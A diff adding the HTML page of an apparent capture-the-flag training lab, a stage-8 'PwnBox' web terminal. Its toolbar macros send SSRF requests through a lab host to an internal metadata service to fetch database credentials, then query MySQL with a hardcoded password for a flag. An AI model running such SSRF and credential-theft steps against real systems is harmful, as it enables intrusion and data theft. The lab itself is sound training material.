@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ShadowNet // PwnBox Terminal - Stage 8</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css" />
+  <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    html, body {
+      width: 100%;
+      height: 100%;
+      background-color: #080A0D;
+      color: #F5F5F5;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Top Navigation / Status Header */
+    header {
+      flex: 0 0 auto;
+      background-color: #0E1217;
+      border-bottom: 1px solid #242C37;
+      padding: 8px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      z-index: 20;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .badge-stage {
+      background: #141920;
+      border: 1px solid #FF6B00;
+      color: #FF6B00;
+      font-weight: 800;
+      font-size: 11px;
+      padding: 2px 8px;
+      border-radius: 4px;
+      letter-spacing: 0.5px;
+    }
+    .title {
+      font-weight: 700;
+      font-size: 14px;
+      color: #F5F5F5;
+      letter-spacing: -0.3px;
+    }
+    .target-badge {
+      font-size: 11px;
+      color: #8B949E;
+      background: #141920;
+      padding: 3px 10px;
+      border-radius: 4px;
+      border: 1px solid #242C37;
+    }
+    .target-badge strong {
+      color: #FF9F43;
+    }
+    .header-actions {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .status-badge {
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 10px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .status-online {
+      background: rgba(16, 185, 129, 0.15);
+      color: #10B981;
+      border: 1px solid rgba(16, 185, 129, 0.3);
+    }
+    .status-offline {
+      background: rgba(239, 68, 68, 0.15);
+      color: #EF4444;
+      border: 1px solid rgba(239, 68, 68, 0.3);
+    }
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: currentColor;
+    }
+
+    /* Attack Shortcut Quick Toolbar */
+    .toolbar {
+      flex: 0 0 auto;
+      background: #141920;
+      border-bottom: 1px solid #242C37;
+      padding: 6px 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      overflow-x: auto;
+      white-space: nowrap;
+      z-index: 10;
+    }
+    .toolbar-label {
+      font-size: 10px;
+      color: #8B949E;
+      text-transform: uppercase;
+      font-weight: bold;
+      margin-right: 4px;
+    }
+    .tool-btn {
+      background: #0E1217;
+      color: #FF9F43;
+      border: 1px solid #242C37;
+      font-family: inherit;
+      font-size: 11px;
+      padding: 4px 10px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      user-select: none;
+    }
+    .tool-btn:hover {
+      background: #202936;
+      border-color: #FF9F43;
+      color: #FFF;
+      box-shadow: 0 0 10px rgba(255, 159, 67, 0.2);
+    }
+    .tool-btn.fullscreen-btn {
+      color: #10B981;
+      border-color: rgba(16, 185, 129, 0.4);
+      margin-left: auto;
+    }
+
+    /* 100% Height & Width Terminal Container */
+    #terminal-container {
+      flex: 1 1 0%;
+      min-height: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #080A0D;
+      padding: 8px 12px;
+      position: relative;
+      overflow: hidden;
+    }
+    #terminal {
+      width: 100%;
+      height: 100%;
+    }
+    .xterm-viewport {
+      background-color: #080A0D !important;
+    }
+
+    /* Fallback simple terminal if xterm CDN is unreachable */
+    #fallback-terminal {
+      display: none;
+      width: 100%;
+      height: 100%;
+      background: #080A0D;
+      color: #10B981;
+      padding: 12px;
+      font-size: 13px;
+      line-height: 1.4;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      font-family: monospace;
+    }
+    #fallback-input {
+      display: none;
+      flex: 0 0 auto;
+      border-top: 1px solid #242C37;
+      background: #0E1217;
+      padding: 6px 12px;
+    }
+    #fallback-input input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      color: #F5F5F5;
+      font-family: monospace;
+      outline: none;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="brand">
+      <span class="badge-stage">STAGE 08</span>
+      <span class="title">PWNBOX ATTACK CONSOLE</span>
+    </div>
+
+    <div class="target-badge">
+      TARGET: <strong>Entry Host (localhost:3008)</strong> &rarr; <strong>DB (192.168.100.10:3306)</strong>
+    </div>
+
+    <div class="header-actions">
+      <div id="status" class="status-badge status-offline">
+        <span class="dot"></span>
+        <span id="status-text">CONNECTING...</span>
+      </div>
+    </div>
+  </header>
+
+  <div class="toolbar">
+    <span class="toolbar-label">Quick Macros:</span>
+    <button class="tool-btn" onclick="sendCmd('curl -s http://localhost:3008/ | head -n 15\n')">
+      <span>🌐</span> Probe Entry Host (3008)
+    </button>
+    <button class="tool-btn" onclick="sendCmd('curl -s &quot;http://localhost:3008/fetch?url=http://192.168.100.10:8080/metadata/db-credentials&quot; | jq .\n')">
+      <span>🔑</span> SSRF Fetch DB Creds
+    </button>
+    <button class="tool-btn" onclick="sendCmd('curl -s &quot;http://localhost:3008/fetch?url=http://192.168.100.10:8080/metadata/all&quot; | jq .\n')">
+      <span>☁️</span> SSRF All Metadata
+    </button>
+    <button class="tool-btn" onclick="sendCmd('mysql -h 127.0.0.1 -u db_user -pSecurePass123 -D nexacorp -e &quot;SELECT flag FROM flags WHERE challenge=\'final_breach\';&quot;\n')">
+      <span>🏴</span> Query MySQL Flag
+    </button>
+    <button class="tool-btn" onclick="sendCmd('./stages/stage8-network/ssh_vm.sh\n')">
+      <span>💻</span> SSH VM Shell
+    </button>
+    <button class="tool-btn" onclick="sendCmd('clear\n')">
+      <span>🧹</span> Clear
+    </button>
+
+    <button class="tool-btn fullscreen-btn" onclick="toggleFullscreen()" title="Toggle Fullscreen">
+      <span id="fs-icon">⛶</span> <span id="fs-text">Fullscreen</span>
+    </button>
+  </div>
+
+  <div id="terminal-container">
+    <div id="terminal"></div>
+    <div id="fallback-terminal"></div>
+  </div>
+
+  <div id="fallback-input">
+    <span style="color:#10B981;margin-right:6px;">$</span>
+    <input type="text" id="cmd-box" placeholder="Type command..." autocomplete="off">
+  </div>
+
+  <script>
+    const statusEl = document.getElementById('status');
+    const statusTextEl = document.getElementById('status-text');
+    let ws;
+    let term;
+    let fitAddon;
+
+    function setStatus(online) {
+      if (online) {
+        statusEl.className = 'status-badge status-online';
+        statusTextEl.textContent = 'ONLINE';
+      } else {
+        statusEl.className = 'status-badge status-offline';
+        statusTextEl.textContent = 'DISCONNECTED';
+      }
+    }
+
+    function fitTerminal() {
+      if (fitAddon && term) {
+        try {
+          fitAddon.fit();
+          if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({
+              type: 'resize',
+              cols: term.cols,
+              rows: term.rows
+            }));
+          }
+        } catch (e) {
+          console.warn("fit error", e);
+        }
+      }
+    }
+
+    function toggleFullscreen() {
+      const fsIcon = document.getElementById('fs-icon');
+      const fsText = document.getElementById('fs-text');
+      if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen().then(() => {
+          fsIcon.textContent = '🗗';
+          fsText.textContent = 'Exit Fullscreen';
+          setTimeout(fitTerminal, 100);
+        }).catch(err => console.error(err));
+      } else {
+        document.exitFullscreen().then(() => {
+          fsIcon.textContent = '⛶';
+          fsText.textContent = 'Fullscreen';
+          setTimeout(fitTerminal, 100);
+        });
+      }
+    }
+
+    document.addEventListener('fullscreenchange', () => {
+      const fsIcon = document.getElementById('fs-icon');
+      const fsText = document.getElementById('fs-text');
+      if (!document.fullscreenElement) {
+        fsIcon.textContent = '⛶';
+        fsText.textContent = 'Fullscreen';
+      } else {
+        fsIcon.textContent = '🗗';
+        fsText.textContent = 'Exit Fullscreen';
+      }
+      setTimeout(fitTerminal, 150);
+    });
+
+    function initTerminal() {
+      if (typeof Terminal !== 'undefined') {
+        term = new Terminal({
+          cursorBlink: true,
+          fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace',
+          fontSize: 14,
+          convertEol: true,
+          theme: {
+            background: '#080A0D',
+            foreground: '#F5F5F5',
+            cursor: '#FF6B00',
+            selectionBackground: 'rgba(255, 107, 0, 0.3)',
+            black: '#141920',
+            red: '#EF4444',
+            green: '#10B981',
+            yellow: '#F59E0B',
+            blue: '#3B82F6',
+            magenta: '#EC4899',
+            cyan: '#06B6D4',
+            white: '#F5F5F5'
+          }
+        });
+
+        if (typeof FitAddon !== 'undefined' && FitAddon.FitAddon) {
+          fitAddon = new FitAddon.FitAddon();
+          term.loadAddon(fitAddon);
+        }
+
+        const termEl = document.getElementById('terminal');
+        term.open(termEl);
+
+        // Immediate fit + delayed fits for layout settles
+        fitTerminal();
+        setTimeout(fitTerminal, 50);
+        setTimeout(fitTerminal, 200);
+        setTimeout(fitTerminal, 500);
+
+        // ResizeObserver to automatically resize terminal to full width/height
+        if (window.ResizeObserver) {
+          const ro = new ResizeObserver(() => {
+            requestAnimationFrame(fitTerminal);
+          });
+          ro.observe(document.getElementById('terminal-container'));
+        }
+
+        window.addEventListener('resize', () => {
+          fitTerminal();
+        });
+
+        term.onData(data => {
+          if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({ type: 'stdin', data: data }));
+          }
+        });
+      } else {
+        // Fallback simple terminal if xterm CDN is unreachable
+        document.getElementById('fallback-terminal').style.display = 'block';
+        document.getElementById('fallback-input').style.display = 'flex';
+        const cmdBox = document.getElementById('cmd-box');
+        cmdBox.addEventListener('keydown', (e) => {
+          if (e.key === 'Enter') {
+            const val = cmdBox.value + '\n';
+            if (ws && ws.readyState === WebSocket.OPEN) {
+              ws.send(JSON.stringify({ type: 'stdin', data: val }));
+            }
+            cmdBox.value = '';
+          }
+        });
+      }
+
+      connectWS();
+    }
+
+    function connectWS() {
+      const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+      const wsUrl = `${proto}//${window.location.host}/ws`;
+
+      ws = new WebSocket(wsUrl);
+      ws.binaryType = 'arraybuffer';
+
+      ws.onopen = () => {
+        setStatus(true);
+        setTimeout(fitTerminal, 50);
+      };
+
+      ws.onmessage = (event) => {
+        if (term) {
+          if (typeof event.data === 'string') {
+            term.write(event.data);
+          } else {
+            const text = new TextDecoder().decode(event.data);
+            term.write(text);
+          }
+        } else {
+          const fb = document.getElementById('fallback-terminal');
+          const text = typeof event.data === 'string' ? event.data : new TextDecoder().decode(event.data);
+          fb.textContent += text;
+          fb.scrollTop = fb.scrollHeight;
+        }
+      };
+
+      ws.onclose = () => {
+        setStatus(false);
+        setTimeout(connectWS, 2000);
+      };
+
+      ws.onerror = () => {
+        setStatus(false);
+      };
+    }
+
+    function sendCmd(cmd) {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({ type: 'stdin', data: cmd }));
+      }
+      if (term) term.focus();
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      if (document.fonts && document.fonts.ready) {
+        document.fonts.ready.then(initTerminal);
+      } else {
+        initTerminal();
+      }
+    });
+  </script>
+</body>
+</html>
